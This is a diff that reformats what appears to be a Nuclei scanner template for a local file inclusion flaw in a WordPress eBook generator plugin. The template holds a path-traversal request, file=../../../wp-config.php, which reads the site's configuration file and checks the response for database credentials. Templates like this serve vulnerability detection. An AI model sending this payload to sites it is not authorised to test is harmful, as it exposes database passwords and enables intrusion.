@@ -1,5 +1,4 @@
 id: aspose-file-download
-
 info:
   name: Wordpress Aspose Cloud eBook Generator - Local File Inclusion
   author: 0x_Akoko
@@ -10,26 +9,22 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
-    cwe-id: CWE-22
+    cwe-id: CWE-22,CWE-23,CWE-73
   metadata:
     max-request: 1
-  tags: aspose,ebook,wpscan,wordpress,wp-plugin,lfi,vuln
-
+  tags: aspose,ebook,lfi,vuln,wordpress,wp-plugin,wpscan
 http:
-  - method: GET
+  - matchers:
+      - condition: and
+        part: body
+        type: word
+        words:
+          - DB_NAME
+          - DB_PASSWORD
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php'
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        words:
-          - "DB_NAME"
-          - "DB_PASSWORD"
-        part: body
-        condition: and
-
-      - type: status
-        status:
-          - 200
-
